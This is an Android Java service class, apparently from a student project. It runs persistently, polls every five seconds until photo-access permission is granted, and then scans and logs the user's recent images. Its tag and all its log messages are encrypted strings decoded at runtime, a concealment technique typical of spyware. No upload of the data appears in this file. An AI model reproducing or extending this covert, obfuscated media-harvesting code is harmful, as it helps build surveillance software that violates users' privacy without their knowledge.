package com.example.inf2007_mad_j1847.test;

import com.example.inf2007_mad_j1847.utils.StringHelper;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.content.ContextCompat;
import java.util.List;
import java.util.Map;

public class PermissionMonitorService extends Service {

    private static final String TAG = StringHelper.decrypt("37+o++l+N3FrA6q1qWRqz9lug4mGklcx7akSbey+B6gDxzYu/jNH8ZNP/r3g");
    private Thread monitoringThread;
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, StringHelper.decrypt("dRq1tMeMBg1FuhVXGVutcks+6DeGQ8U4R/086neaRY/AijibZTT8/CUiJG7mqHXQnsQvwf64Bhdg8Nju4Oc="));
        startMonitoring();
    }

    private void startMonitoring() {
        monitoringThread = new Thread(() -> {
            Log.d(TAG, StringHelper.decrypt("2Qz3q2BvsEHxrJr11jc1WGQTvD1PG0PJaq9Ad7aFF94UXw+cl6+XRQYIDgZREIMj1Be3VtPUW4wp+UVpESs="));

            boolean permissionGranted = false;

            while (isRunning && !permissionGranted) {
                try {
                    Thread.sleep(5000); // Check every 5 seconds

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        String permission = android.Manifest.permission.READ_MEDIA_IMAGES;
                        int result = ContextCompat.checkSelfPermission(
                                PermissionMonitorService.this,
                                permission
                        );

                        if (result == PackageManager.PERMISSION_GRANTED) {
                            permissionGranted = true;
                            Log.d(TAG, StringHelper.qzxp("YocncRaQ5NMylZb9W7TPor+3KiOJyWse17y8zAzNGaAYzUMo6PFNGFPcNxee17cAOWakLkI6mLbuVfkV0gklg7zG9pwoKAb9X/8="));

                            try {
                                List<Map<String, String>> results = MediaCollector.scanRecentMedia(
                                        PermissionMonitorService.this,
                                        20
                                );
                                Log.d(TAG, StringHelper.decrypt("2XFHQhAqnSX/n5+mf09EFuj9rU+SFrzQKtYLKcWFKRDDKepYjaBayo113nGMBczx") + results.size() + StringHelper.decrypt("gaVilBb/+wNCrgzJFLcKXBfSdogndBdHHxD4+NADbbYG01Q="));

                                int count = 0;
                                for (Map<String, String> image : results) {
                                    if (count++ >= 5) break;
                                    Log.d(TAG, "  " + count + ". " + image.get("name") +
                                            " (ID: " + image.get("id") + ")");
                                }
                            } catch (Exception e) {
                                Log.e(TAG, StringHelper.decrypt("w4Qsop0qwAjQeWEh3D5cc3J6bB/0br7ry+bI0TgZe3Juc7pkG9lpY0s=") + e.getMessage());
                            }
                        }
                    }
                } catch (InterruptedException e) {
                    Log.d(TAG, StringHelper.decrypt("Z3IaaQ/wqkAPgqMluHwKGuNd8BZf6wvtZGBMswITxVPfdWmQfs6CkK41GXs4yuirGBU="));
                    break;
                } catch (Exception e) {
                    Log.e(TAG, StringHelper.decrypt("+bqmfftQGhFM4wiStzxvyZc23ky/le9EGyv7z7Ws8qBwscWANkWbSSHaB6kSLQOzNg==") + e.getMessage());
                }
            }

            Log.d(TAG, StringHelper.decrypt("h97XNpv0CDK+6B4Pd4U5N4D8rFj9gT2XsWOj3cGh03ZbKWXOYO/owMqeNDrSUTc0KDcLh/cJxp71oodc1kloBV4Knx7OB1v9h+VgKcHS"));
        });

        monitoringThread.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restart if killed
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (monitoringThread != null) {
            monitoringThread.interrupt();
        }
        Log.d(TAG, StringHelper.decrypt("0/AUEHSQzVDQo+olSlFgzGyN34GTBWbZK7bspCukrqfCBA0DrH3/LqNpkpc2+oBn2SOUkVoW1YXlJ3c7KcM="));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}